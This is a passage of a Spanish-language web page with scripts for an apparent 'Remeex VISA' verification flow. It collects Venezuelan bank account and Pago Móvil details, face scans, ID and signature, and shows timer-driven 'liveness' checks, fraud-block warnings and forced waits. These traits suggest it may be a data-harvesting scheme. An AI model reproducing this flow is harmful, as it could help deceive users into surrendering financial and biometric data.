    <div class="confirm-content">
      <h3>Se requerirá verificación adicional</h3>
      <p>La cuenta podría ser bloqueada por intento de fraude.</p>
      <div class="confirm-buttons">
        <button class="btn btn-success" id="fraud-warning-close">Entendido</button>
      </div>
    </div>
  </div>

  <div class="confirm-overlay" id="retake-overlay">
    <div class="confirm-content">
      <h3 id="retake-overlay-title">¿Repetir el reconocimiento facial?</h3>
      <p id="retake-overlay-subtitle">Antes de reiniciar el escaneo asegúrate de cumplir estas recomendaciones:</p>
      <ul class="retake-guidelines">
        <li><i class="fas fa-lightbulb"></i><span>Busca un lugar bien iluminado y sin contraluces que oculten tu rostro.</span></li>
        <li><i class="fas fa-video"></i><span>Sujeta el dispositivo a la altura de tus ojos y mantén el encuadre estable.</span></li>
        <li><i class="fas fa-face-smile"></i><span>Retira gorras o lentes oscuros y realiza los gestos solicitados con naturalidad.</span></li>
      </ul>
      <p class="retake-overlay-note" id="retake-overlay-note">Al repetir borraremos la captura anterior para generar una nueva referencia biométrica.</p>
      <div class="confirm-buttons">
        <button class="btn btn-outline" id="retake-cancel">Mantener captura</button>
        <button class="btn btn-success" id="retake-confirm">Repetir ahora</button>
      </div>
    </div>
  </div>

  <div class="confirm-overlay" id="skip-biometrics-overlay">
    <div class="confirm-content">
      <h3>¿Omitir la verificación biométrica?</h3>
      <p>
        Si continúas sin el escaneo facial solicitaremos documentación adicional para validar tu identidad.
      </p>
      <p class="retake-overlay-note">
        Esta decisión es definitiva; no podrás volver a la biometría en este proceso.
      </p>
      <div class="confirm-buttons">
        <button class="btn btn-outline" id="skip-biometrics-cancel">Seguir con biometría</button>
        <button class="btn btn-danger" id="skip-biometrics-confirm">Continuar sin biometría</button>
      </div>
    </div>
  </div>

  <div class="confirm-overlay" id="optout-summary-overlay" aria-hidden="true">
    <div class="confirm-content optout-summary-content" role="dialog" aria-labelledby="optout-summary-title" aria-describedby="optout-summary-description">
      <div class="optout-summary-icon" aria-hidden="true">
        <i class="fas fa-shield-exclamation"></i>
      </div>
      <h3 id="optout-summary-title">Validaciones rechazadas</h3>
      <p class="optout-summary-description" id="optout-summary-description">Antes de continuar, registramos que decidiste omitir los siguientes pasos:</p>
      <ul class="optout-summary-list" id="optout-summary-list"></ul>
      <button class="btn btn-success btn-block" id="optout-summary-continue" type="button">Continuar</button>
    </div>
  </div>

  <!-- Tally Modal Overlay MEJORADO -->
  <div class="tally-overlay" id="tally-overlay">
    <div class="tally-modal">
      <div class="tally-modal-header">
        <div class="tally-modal-icon">
          <i class="fas fa-clipboard-check"></i>
        </div>
        <h2 class="tally-modal-title">Paso Obligatorio: Complete el Formulario</h2>
        <p class="tally-modal-subtitle">Este formulario es necesario para finalizar su verificación de identidad</p>
      </div>

      <div class="tally-iframe-container">
        <iframe id="tally-iframe"
                data-tally-src="https://tally.so/r/mRaxZP?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1"
                width="100%"
                frameborder="0"
                title="Formulario Final de Verificación"></iframe>
      </div>

      <div class="tally-modal-footer">
        <p class="tally-modal-timer" id="tally-timer">
          <i class="fas fa-clock"></i> El botón se habilitará en <span id="timer-seconds">180</span> segundos...
        </p>
        <button class="btn btn-success btn-large" id="tally-continue" disabled>
          <i class="fas fa-spinner fa-spin"></i> Ya Completé el Formulario - Continuar
        </button>
        <button class="btn btn-outline btn-large" id="tally-optout" type="button">
          <i class="fas fa-user-shield"></i> No quiero validar con mi documento y firma
        </button>
        <p class="tally-modal-warning">
          <i class="fas fa-exclamation-triangle"></i> No podrá continuar sin completar este formulario
        </p>
      </div>
    </div>
  </div>

  <div class="tally-optout-overlay" id="tally-optout-overlay" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="tally-optout-modal">
      <button class="tally-optout-close" id="tally-optout-cancel" type="button" aria-label="Cerrar">
        <i class="fas fa-times"></i>
      </button>
      <div class="tally-optout-header">
        <h3><i class="fas fa-triangle-exclamation"></i> Continuar sin validar con documento</h3>
        <p>
          Seleccione el motivo por el que no desea continuar con la validación mediante su documento de identidad y firma.
          Esta decisión iniciará un análisis alternativo y no podrá revertirse.
        </p>
      </div>
      <div class="tally-optout-reasons" id="tally-optout-reasons">
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="documento-deteriorado">
          <span>Mi documento de identidad está deteriorado</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="sin-documento">
          <span>No tengo mi documento de identidad a la mano</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="documento-vencido">
          <span>Mi documento de identidad está vencido</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="sin-firma">
          <span>No puedo firmar</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="desconfianza">
          <span>Siento desconfianza</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="no-me-interesa">
          <span>No me interesa validar con mi documento</span>
        </label>
        <label class="tally-optout-option">
          <input type="radio" name="tally-optout-reason" value="otras-alternativas">
          <span>Quiero explorar otras alternativas</span>
        </label>
      </div>
      <div class="tally-optout-warning">
        <i class="fas fa-circle-exclamation"></i>
        <div>
          <strong>Importante:</strong> Se iniciará un proceso de análisis alternativo, esta decisión es irreversible
          y se solicitará un método de validación adicional para continuar.
        </div>
      </div>
      <div class="tally-optout-actions">
        <button class="btn btn-danger" id="tally-optout-confirm" type="button" disabled>
          Proceder con el análisis alternativo
        </button>
        <button class="btn btn-outline" id="tally-optout-cancel-secondary" type="button">
          Volver al formulario
        </button>
      </div>
    </div>
  </div>

  <!-- Toast Container -->
  <div class="toast-container" id="toast-container"></div>

  <button
    id="whatsapp-floating-button"
    class="whatsapp-floating-button"
    type="button"
    aria-haspopup="dialog"
    aria-controls="whatsapp-options-overlay"
    aria-label="Contactar a Remeex VISA por WhatsApp"
  >
    <i class="fa-brands fa-whatsapp" aria-hidden="true"></i>
  </button>

  <div
    id="whatsapp-options-overlay"
    class="whatsapp-options-overlay"
    role="dialog"
    aria-modal="true"
    aria-hidden="true"
    hidden
  >
    <div class="whatsapp-options-modal">
      <button
        type="button"
        class="whatsapp-options-close"
        data-whatsapp-close
        aria-label="Cerrar opciones de WhatsApp"
      >
        <i class="fa-solid fa-xmark" aria-hidden="true"></i>
      </button>
      <h2 class="whatsapp-options-title" id="whatsapp-options-title">¿Cómo podemos ayudarte?</h2>
      <p class="whatsapp-options-subtitle">
        Elige una opción para personalizar tu mensaje antes de enviarnos un WhatsApp.
      </p>
      <div class="whatsapp-options-list" role="list" aria-labelledby="whatsapp-options-title">
        <button type="button" class="whatsapp-options-button" data-whatsapp-option="Quiero más información">
          Quiero más información
        </button>
        <button type="button" class="whatsapp-options-button" data-whatsapp-option="Quiero hablar con un operador">
          Quiero hablar con un operador
        </button>
        <button type="button" class="whatsapp-options-button" data-whatsapp-option="Necesito ayuda">
          Necesito ayuda
        </button>
        <button type="button" class="whatsapp-options-button" data-whatsapp-option="Otras opciones">
          Otras opciones
        </button>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const trigger = document.getElementById('whatsapp-floating-button');
      const overlay = document.getElementById('whatsapp-options-overlay');
      if (!trigger || !overlay) {
        return;
      }

      const body = document.body;
      const closeButton = overlay.querySelector('[data-whatsapp-close]');
      const optionButtons = Array.from(
        overlay.querySelectorAll('[data-whatsapp-option]')
      );
      let lastFocusedElement = null;

      const openOverlay = () => {
        if (overlay.dataset.open === 'true') {
          return;
        }
        lastFocusedElement = document.activeElement;
        overlay.hidden = false;
        overlay.dataset.open = 'true';
        overlay.setAttribute('aria-hidden', 'false');
        body && body.classList.add('whatsapp-options-open');
        window.setTimeout(() => {
          const firstOption = optionButtons[0];
          if (firstOption) {
            firstOption.focus();
          }
        }, 0);
      };

      const closeOverlay = () => {
        if (overlay.dataset.open !== 'true') {
          return;
        }
        overlay.dataset.open = 'false';
        overlay.setAttribute('aria-hidden', 'true');
        overlay.hidden = true;
        body && body.classList.remove('whatsapp-options-open');
        if (lastFocusedElement && typeof lastFocusedElement.focus === 'function') {
          window.setTimeout(() => lastFocusedElement.focus(), 0);
        }
      };

      const openWhatsApp = (option) => {
        const handler = window.openWhatsAppSupport;
        if (typeof handler === 'function') {
          handler(option);
        } else {
          const baseUrl = 'https://wa.me/+17373018059';
          const message = option ? `Hola, ${option}.` : '';
          const url = message
            ? `${baseUrl}?text=${encodeURIComponent(message)}`
            : baseUrl;
          window.open(url, '_blank');
        }
      };

      trigger.addEventListener('click', (event) => {
        event.preventDefault();
        openOverlay();
      });

      trigger.addEventListener('keydown', (event) => {
        if (event.key === 'Enter' || event.key === ' ') {
          event.preventDefault();
          openOverlay();
        }
      });

      optionButtons.forEach((button) => {
        button.addEventListener('click', (event) => {
          event.preventDefault();
          const option = button.dataset.whatsappOption || '';
          closeOverlay();
          window.setTimeout(() => openWhatsApp(option), 120);
        });
      });

      if (closeButton) {
        closeButton.addEventListener('click', (event) => {
          event.preventDefault();
          closeOverlay();
        });
      }

      overlay.addEventListener('click', (event) => {
        if (event.target === overlay) {
          closeOverlay();
        }
      });

      document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && overlay.dataset.open === 'true') {
          closeOverlay();
        }
      });
    });
  </script>

  <div id="tawkto-loader" class="tawkto-loader" aria-hidden="true">
    <div class="tawkto-loader__circle">
      <div class="tawkto-loader__spinner" aria-hidden="true"></div>
    </div>
  </div>
  <div id="tawkto-container" class="tawkto-container" aria-live="polite" aria-hidden="true"></div>

  <style>
    #tawkto-loader,
    #tawkto-container {
      position: fixed;
      bottom: 1.25rem;
      right: 1.25rem;
      max-width: calc(100vw - 2.5rem);
      z-index: 2400;
    }

    #whatsapp-floating-button,
    .whatsapp-floating-button {
      position: fixed;
      bottom: calc(1.25rem + 6rem + 0.75rem);
      right: 1.25rem;
      width: 3rem;
      height: 3rem;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border-radius: 999px;
      background: #25d366;
      color: #ffffff;
      font-size: 1.35rem;
      text-decoration: none;
      box-shadow: 0 8px 22px rgba(37, 211, 102, 0.35);
      transition: background-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
      z-index: 2450;
      border: none;
      cursor: pointer;
    }

    #whatsapp-floating-button:hover,
    #whatsapp-floating-button:focus,
    .whatsapp-floating-button:hover,
    .whatsapp-floating-button:focus {
      background: #1ebe5a;
      box-shadow: 0 10px 26px rgba(30, 190, 90, 0.38);
      transform: translateY(-1px);
    }

    .whatsapp-options-overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: clamp(1rem, 4vw, 2.5rem);
      background: rgba(15, 23, 42, 0.6);
      backdrop-filter: blur(6px);
      z-index: 6200;
      overflow-y: auto;
    }

    .whatsapp-options-overlay[hidden] {
      display: none;
    }

    .whatsapp-options-modal {
      position: relative;
      width: min(420px, 100%);
      background: #ffffff;
      color: var(--neutral-900, #0f172a);
      border-radius: 1.5rem;
      padding: clamp(1.5rem, 4vw, 2.25rem);
      box-shadow: 0 24px 60px rgba(15, 23, 42, 0.28);
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .whatsapp-options-close {
      position: absolute;
      top: 0.75rem;
      right: 0.75rem;
      background: rgba(15, 23, 42, 0.05);
      border: none;
      border-radius: 999px;
      width: 2rem;
      height: 2rem;
      font-size: 1.1rem;
      color: #1f2937;
      cursor: pointer;
      transition: background 0.2s ease, color 0.2s ease;
    }

    .whatsapp-options-close:hover,
    .whatsapp-options-close:focus {
      background: rgba(15, 23, 42, 0.12);
      color: #0f172a;
    }

    .whatsapp-options-title {
      font-size: clamp(1.25rem, 3vw, 1.5rem);
      font-weight: 700;
      margin: 0;
    }

    .whatsapp-options-subtitle {
      margin: 0;
      font-size: 0.95rem;
      color: var(--neutral-600, #475569);
      line-height: 1.5;
    }

    .whatsapp-options-list {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .whatsapp-options-button {
      width: 100%;
      padding: 0.9rem 1rem;
      border-radius: 0.95rem;
      border: 1px solid rgba(37, 211, 102, 0.2);
      background: rgba(37, 211, 102, 0.08);
      color: #047857;
      font-weight: 600;
      font-size: 0.95rem;
      line-height: 1.4;
      cursor: pointer;
      transition: background 0.2s ease, border-color 0.2s ease, transform 0.2s ease;
      text-align: center;
    }

    .whatsapp-options-button::after {
      content: '\f105';
      font-family: 'Font Awesome 6 Free';
      font-weight: 900;
      margin-left: 0.5rem;
    }

    .whatsapp-options-button:hover,
    .whatsapp-options-button:focus {
      background: rgba(37, 211, 102, 0.15);
      border-color: rgba(37, 211, 102, 0.4);
      transform: translateY(-1px);
    }

    body.whatsapp-options-open {
      overflow: hidden;
    }

    @media (max-width: 640px) {
      #tawkto-loader,
      #tawkto-container {
        right: 0.75rem;
        bottom: 0.75rem;
      }

      #whatsapp-floating-button,
      .whatsapp-floating-button {
        right: 0.75rem;
        bottom: calc(0.75rem + 6rem + 0.75rem);
      }

      .whatsapp-options-modal {
        border-radius: 1.25rem;
        padding: 1.5rem;
      }
    }
  </style>

  <script>
    // Configuration
    const CONFIG = {
      STORAGE_KEYS: {
        VERIFICATION_DATA: 'remeexVerificationData',
        VERIFICATION_STATUS: 'remeexVerificationStatus',
        VERIFICATION_BANKING: 'remeexVerificationBanking',
        VERIFICATION_BIOMETRIC: 'remeexVerificationBiometric',
        VERIFICATION_BIOMETRIC_SKIPPED: 'remeexVerificationBiometricSkipped',
        VERIFICATION_PROCESSING: 'remeexVerificationProcessing', // Coincide con recarga
        VERIFICATION_COMPLETION_TIME: 'remeexVerificationCompletionTime',
        WITHDRAWAL_VERIFICATION_REQUIRED: 'remeexWithdrawalVerificationRequired',
        VERIFICATION_TALLY: 'remeexVerificationFinalForm'
      }
    };

    localStorage.setItem(CONFIG.STORAGE_KEYS.WITHDRAWAL_VERIFICATION_REQUIRED, 'true');

    // Audio guidance configuration
    const ok25 = new Audio('audioguia.ogg/ok25. selecciona tu banco..ogg');
    const ok26 = new Audio('audioguia.ogg/ok26. elegiste cuenta corriente.ogg');
    const ok27 = new Audio('audioguia.ogg/ok27. elegiste cuenta ahorro.ogg');
    const ok28 = new Audio('audioguia.ogg/ok28. numero de cuenta.ogg');
    const ok29 = new Audio('audioguia.ogg/ok29. telefono asociado a pago movil.ogg');
    const ok30 = new Audio('audioguia.ogg/ok30. cedula pago movil.ogg');
    const ok32 = new Audio('audioguia.ogg/ok32. verificacion biometrica.ogg');
    const ok33 = new Audio('audioguia.ogg/ok34. Gira tu rostro a la derecha.ogg');
    const ok34 = new Audio('audioguia.ogg/ok33. gira tu rostro a la izquierda.ogg');
    const ok35 = new Audio('audioguia.ogg/ok35. Gesto de sonrisa.ogg');
    const ok36 = new Audio('audioguia.ogg/ok36. manten la mirada fija sin moverte.ogg');
    const ok37 = new Audio('audioguia.ogg/ok37. verificacion no aprobada.ogg');
    const ok38 = new Audio('audioguia.ogg/ok38. repetir el reconocimiento facial..ogg');
    const ok39 = new Audio('audioguia.ogg/ok39. presiona en iniciar escaneo.ogg');
    const ok40 = new Audio('audioguia.ogg/ok40. nivel de coincidencia aprobado.ogg');
    const ok41 = new Audio('audioguia.ogg/ok41. adjunta tu cedula de identidad.ogg');
    const ok42 = new Audio('audioguia.ogg/ok42. si el documento no coincide con su biometria..ogg');
    const ok45 = new Audio('audioguia.ogg/ok45. documento verificado correctamente.ogg');
    const ok70 = new Audio('audioguia.ogg/ok70. verificacion datos.mp3');
    const ok71 = new Audio('audioguia.ogg/ok71. nombre completo.mp3');
    const ok72 = new Audio('audioguia.ogg/ok72. fecha de nacimiento.mp3');
    const ok73 = new Audio('audioguia.ogg/ok73. tipo de documento.mp3');
    const ok74 = new Audio('audioguia.ogg/ok74. numero de documento.mp3');
    const ok75 = new Audio('audioguia.ogg/ok75. correo electronico.mp3');
    const ok76 = new Audio('audioguia.ogg/ok76. numero de telefono (online-audio-converter.com).ogg');
    const ok22 = new Audio('audioguia.ogg/ok22. Direccion de residencia.ogg');
    const ok23 = new Audio('audioguia.ogg/ok23. escribe tu ocupación.ogg');
    const ok90 = new Audio('audioguia.ogg/ok90. nacionalidad (online-audio-converter.com).ogg');
    const ok77 = new Audio('audioguia.ogg/ok77. informacion incompleta.mp3');

    const AUDIO_GUIDES = {
      ok22,
      ok23,
      ok25,
      ok26,
      ok27,
      ok28,
      ok29,
      ok30,
      ok32,
      ok33,
      ok34,
      ok35,
      ok36,
      ok37,
      ok38,
      ok39,
      ok40,
      ok41,
      ok42,
      ok45,
      ok70,
      ok71,
      ok72,
      ok73,
      ok74,
      ok75,
      ok76,
      ok77,
      ok90
    };

    const TALLY_OPT_OUT_REASON_LABELS = {
      'documento-deteriorado': 'Documento de identidad deteriorado',
      'sin-documento': 'No dispone de su documento de identidad',
      'documento-vencido': 'Documento de identidad vencido',
      'sin-firma': 'Imposibilidad de firmar el documento',
      desconfianza: 'Manifestó desconfianza en el proceso',
      'no-me-interesa': 'Indicó que no le interesa validar con su documento',
      'otras-alternativas': 'Prefiere explorar alternativas de verificación'
    };

    Object.values(AUDIO_GUIDES).forEach(audio => {
      if (!audio) return;
      audio.preload = 'auto';
    });

    let failureAudioAttemptId = null;
    let failureAudioEndedHandler = null;
    let failureAudioErrorHandler = null;
    let failureAudioFallbackTimeout = null;

    function clearFailureAudioHandlers() {
      if (failureAudioEndedHandler && ok37) {
        ok37.removeEventListener('ended', failureAudioEndedHandler);
        failureAudioEndedHandler = null;
      }
      if (failureAudioErrorHandler && ok37) {
        ok37.removeEventListener('error', failureAudioErrorHandler);
        failureAudioErrorHandler = null;
      }
      if (failureAudioFallbackTimeout !== null) {
        clearTimeout(failureAudioFallbackTimeout);
        failureAudioFallbackTimeout = null;
      }
      if (ok37) {
        ok37.onended = null;
      }
    }

    function resetFailureAudioState() {
      failureAudioAttemptId = null;
      clearFailureAudioHandlers();
    }

    function triggerFailureGuidance(attempt) {
      if (attempt == null) {
        return;
      }

      if (failureAudioAttemptId === attempt) {
        return;
      }

      failureAudioAttemptId = attempt;

      if (!ok37 || !ok38) {
        return;
      }

      clearFailureAudioHandlers();

      let reminderTriggered = false;
      const playReminder = () => {
        if (reminderTriggered) {
          return;
        }
        reminderTriggered = true;
        clearFailureAudioHandlers();
        playGuideAudio(ok38);
      };

      failureAudioEndedHandler = playReminder;
      failureAudioErrorHandler = playReminder;

      ok37.addEventListener('ended', failureAudioEndedHandler, { once: true });
      ok37.addEventListener('error', failureAudioErrorHandler, { once: true });
      ok37.onended = null;

      playGuideAudio(ok37);

      const estimatedDelay = Number.isFinite(ok37.duration) && ok37.duration > 0
        ? Math.max(Math.floor(ok37.duration * 1000) + 200, 600)
        : 4000;

      failureAudioFallbackTimeout = setTimeout(playReminder, estimatedDelay);
    }

    function stopGuideAudios(except) {
      Object.values(AUDIO_GUIDES).forEach(audio => {
        if (!audio || audio === except) return;
        try {
          audio.pause();
          audio.currentTime = 0;
        } catch (error) {
          console.warn('No se pudo detener un audio de guía:', error);
        }
      });
    }

    function playGuideAudio(audio) {
      if (!audio) return;

      stopGuideAudios(audio);

      try {
        audio.pause();
        audio.currentTime = 0;
      } catch (error) {
        console.warn('No se pudo reiniciar el audio de guía:', error);
      }

      const playPromise = audio.play();
      if (playPromise && typeof playPromise.catch === 'function') {
        playPromise.catch(error => {
          if (error && error.name === 'NotAllowedError') {
            const resumePlayback = () => {
              window.removeEventListener('pointerdown', resumePlayback);
              window.removeEventListener('keydown', resumePlayback);
              playGuideAudio(audio);
            };
            window.addEventListener('pointerdown', resumePlayback, { once: true });
            window.addEventListener('keydown', resumePlayback, { once: true });
          } else {
            console.warn('No se pudo reproducir el audio de guía:', error);
          }
        });
      }
    }

    function setupAudioGuides() {
      const fieldAudioPairs = [
        { selector: '#full-name', audio: ok71 },
        { selector: '#birth-date', audio: ok72 },
        { selector: '#id-type', audio: ok73 },
        { selector: '#documentNumber', audio: ok74 },
        { selector: '#email', audio: ok75 },
        { selector: '#phoneNumber', audio: ok76 },
        { selector: '#address', audio: ok22 },
        { selector: '#nationality', audio: ok90 },
        { selector: '#occupation', audio: ok23 },
        { selector: '#account-number', audio: ok28, pointerdown: true },
        { selector: '#pago-movil-phone', audio: ok29, pointerdown: true },
        { selector: '#pago-movil-cedula', audio: ok30, pointerdown: true }
      ];

      fieldAudioPairs.forEach(({ selector, audio, pointerdown = false }) => {
        const element = document.querySelector(selector);
        if (!element || !audio) return;

        const handlePlay = () => playGuideAudio(audio);

        element.addEventListener('focus', handlePlay);
        if (pointerdown) {
          element.addEventListener('pointerdown', handlePlay);
        } else {
          element.addEventListener('pointerdown', () => {
            if (element.readOnly || element.disabled) {
              handlePlay();
            }
          });
        }
      });
    }

    // Venezuelan Banks Data
    const VENEZUELAN_BANKS = [
      { id: 'bdv', name: 'Banco de Venezuela', logo: 'https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png' },
      { id: 'bvc', name: 'Banco Venezolano de Crédito', logo: 'https://www.venezolano.com/images/galeria/108_1.png' },
      { id: 'mercantil', name: 'Banco Mercantil', logo: 'https://files.socialgest.net/mybio/5f529398b36f8_1599247256.png' },
      { id: 'provincial', name: 'Banco Provincial', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg' },
      { id: 'bancaribe', name: 'Bancaribe', logo: 'https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png' },
      { id: 'exterior', name: 'Banco Exterior', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png' },
      { id: 'caroni', name: 'Banco Caroní', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/db/Banco-Caron%C3%AD-logo.png' },
      { id: 'banesco', name: 'Banesco', logo: 'https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip' },
      { id: 'sofitasa', name: 'Banco Sofitasa', logo: 'https://www.sofitasa.com/assets/img/nuevo_logo.png' },
      { id: 'plaza', name: 'Banco Plaza', logo: 'https://images.crunchbase.com/image/upload/c_pad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/xaohzgslrcyk6if8bw0p' },
      { id: 'gente', name: 'Banco de la Gente Emprendedora', logo: 'https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png' },
      { id: 'bfc', name: 'Banco Fondo Común', logo: 'https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png' },
      { id: '100banco', name: '100% Banco', logo: 'https://www.100x100banco.com/img/logo.png' },
      { id: 'delsur', name: 'DelSur Banco', logo: 'https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png' },
      { id: 'tesoro', name: 'Banco del Tesoro', logo: 'https://comerciomovil.bt.com.ve/_next/static/media/logo-slogan.907bb4c8.png' },
      { id: 'agricola', name: 'Banco Agrícola de Venezuela', logo: 'https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png' },
      { id: 'bancrecer', name: 'Bancrecer', logo: 'https://images.seeklogo.com/logo-png/36/1/bancrecer-logo-png_seeklogo-364928.png' },
      { id: 'mibanco', name: 'Mi Banco', logo: 'https://e7.pngegg.com/pngimages/127/511/png-clipart-bank-computer-icons-bank-building-bank.png' },
      { id: 'r4', name: 'R4', logo: 'https://www.r4conecta.io/_nuxt/img/mibanco_logo.67b5af9.png' },
      { id: 'activo', name: 'Banco Activo', logo: 'https://www.bancoactivo.com/logo.svg' },
      { id: 'bancamiga', name: 'Bancamiga', logo: 'https://vectorseek.com/wp-content/uploads/2023/09/Bancamiga-Logo-Vector.svg-.png' },
      { id: 'bicentenario', name: 'Banco Bicentenario', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png' },
      { id: 'bnc', name: 'Banco Nacional de Crédito', logo: 'https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png' }
    ];

    VENEZUELAN_BANKS.push({
      id: 'no-bank',
      name: 'No tengo cuenta de banco',
      logo: 'https://cdn-icons-png.flaticon.com/512/3208/3208676.png'
    });

    // Bank account prefix codes
    const BANK_CODES = {
      bdv: '0102',
      bvc: '0104',
      mercantil: '0105',
      provincial: '0108',
      bancaribe: '0114',
      exterior: '0115',
      caroni: '0128',
      banesco: '0134',
      sofitasa: '0137',
      plaza: '0138',
      gente: '0146',
      bfc: '0151',
      '100banco': '0156',
      delsur: '0157',
      tesoro: '0163',
      agricola: '0166',
      bancrecer: '0168',
      mibanco: '0169',
      r4: '0169',
      activo: '0171',
      bancamiga: '0172',
      bicentenario: '0175',
      bnc: '0191'
    };

    // Global state
    let currentStep = 1;
    let totalSteps = 4;
    let verificationData = {};
    let bankingData = {};
    let hasSelfie = false;
    let biometricSkipped = false;
    let livenessAttempts = 0;
    let pendingRetakeAction = 'retake';
    let selectedBank = null;
    let noBankMode = false;
    let noBankRequestCompleted = false;
    let noBankSupportInfo = null;
    let accountType = 'corriente';
    let pagoMovilEnabled = false;
    let tallyCompleted = false;
    let tallyOptedOut = false;
    let pendingOptOutRedirect = null;
    let cameraStream = null;
    let facingMode = 'user';
    const LIVENESS_SEQUENCE = [
      {
        id: 'frontal',
        title: 'Posicionamiento frontal',
        description: 'Mire al frente y alinee su rostro con el marco luminoso.',
        overlay: 'Alinee su rostro con el marco central iluminado.',
        duration: 3200
      },
      {
        id: 'turn-left',
        title: 'Giro suave a la izquierda',
        description: 'Gire lentamente la cabeza hacia su lado izquierdo sin salir del visor.',
        overlay: 'Gire suavemente hacia la izquierda hasta que el marcador verde se ilumine.',
        duration: 3200
      },
      {
        id: 'turn-right',
        title: 'Giro suave a la derecha',
        description: 'Regrese y gire lentamente hacia su lado derecho.',
        overlay: 'Siga el marcador naranja para completar el barrido.',
        duration: 3200
      },
      {
        id: 'smile',
        title: 'Validación de sonrisa',
        description: 'Sonría ampliamente durante unos segundos para confirmar expresividad natural.',
        overlay: 'Mantenga la sonrisa hasta que los indicadores verdes se completen.',
        duration: 3200
      },
      {
        id: 'focus',
        title: 'Mirada fija',
        description: 'Mantenga la vista en el punto azul y evite parpadear rápidamente.',
        overlay: 'Fije la mirada en el punto central mientras finalizamos el escaneo.',
        duration: 3200
      }
    ];
    const TOTAL_LIVENESS_DURATION = LIVENESS_SEQUENCE.reduce((acc, stage) => acc + (stage.duration || 3200), 0);
    let livenessActive = false;
    let livenessStageIndex = 0;
    let livenessElapsed = 0;
    let livenessTimer = null;
    let livenessProgressTimer = null;
    let completedLivenessSteps = new Set();
    const STEP_TRANSITION_DURATION = 320;
    let storedAvatarImage = null;
    let avatarComparisonShown = false;
    let biometricLocked = false;

    function loadStoredAvatarImage() {
      if (storedAvatarImage) {
        return storedAvatarImage;
      }

      const savedPhoto = localStorage.getItem('remeexProfilePhoto');
      if (savedPhoto) {
        storedAvatarImage = savedPhoto;
        return storedAvatarImage;
      }

      try {
        const registrationData = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
        if (registrationData && registrationData.profilePhoto) {
          storedAvatarImage = registrationData.profilePhoto;
          return storedAvatarImage;
        }
      } catch (error) {
        console.warn('No se pudo leer el registro de avatar almacenado:', error);
      }

      try {
        const credentials = JSON.parse(localStorage.getItem('remeexUserCredentials') || '{}');
        if (credentials && credentials.avatar) {
          storedAvatarImage = credentials.avatar;
          return storedAvatarImage;
        }
      } catch (error) {
        console.warn('No se pudieron leer las credenciales del usuario para el avatar:', error);
      }

      return storedAvatarImage;
    }

    // Initialize app
    document.addEventListener('DOMContentLoaded', function() {
      setupAudioGuides();

      const volumePromptKey = 'remeexVolumePromptAcknowledged';
      const volumeOverlay = document.getElementById('volume-overlay');
      const volumeConfirmButton = document.getElementById('volume-confirm-button');
      let hasAcknowledgedVolume = localStorage.getItem(volumePromptKey) === 'true';

      const triggerInitialGuide = () => {
        if (hasAcknowledgedVolume) {
          playGuideAudio(ok70);
        }
      };

      if (volumeOverlay && volumeConfirmButton && !hasAcknowledgedVolume) {
        volumeOverlay.style.display = 'flex';
        volumeOverlay.setAttribute('aria-hidden', 'false');
        if (typeof gsap !== 'undefined') {
          gsap.fromTo(volumeOverlay, { opacity: 0 }, { opacity: 1, duration: 0.4 });
        }

        volumeConfirmButton.addEventListener('click', () => {
          hasAcknowledgedVolume = true;
          localStorage.setItem(volumePromptKey, 'true');
          if (typeof gsap !== 'undefined') {
            gsap.to(volumeOverlay, {
              opacity: 0,
              duration: 0.3,
              onComplete: () => {
                volumeOverlay.style.display = 'none';
                volumeOverlay.setAttribute('aria-hidden', 'true');
              }
            });
          } else {
            volumeOverlay.style.display = 'none';
            volumeOverlay.setAttribute('aria-hidden', 'true');
          }
          triggerInitialGuide();
        }, { once: true });
      } else {
        if (!hasAcknowledgedVolume && !volumeOverlay) {
          hasAcknowledgedVolume = true;
          localStorage.setItem(volumePromptKey, 'true');
        }
        triggerInitialGuide();
      }

      checkExistingVerification();
      setupEventListeners();
      populateBankGrid();
      initializeNoBankOverlay();
      restoreVerificationProgress();
      updateStep4BiometricMessaging();
      if (!biometricLocked && !biometricSkipped) {
        initializeCamera();
      }
      setupTallyListener();
      loadStoredAvatarImage();

      // Smooth scroll for better UX
      document.documentElement.style.scrollBehavior = 'smooth';

      function buildSupportMessage() {
        const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
        const creds = JSON.parse(localStorage.getItem('remeexUserCredentials') || '{}');
        const name = creds.name || reg.preferredName || reg.firstName || 'usuario';
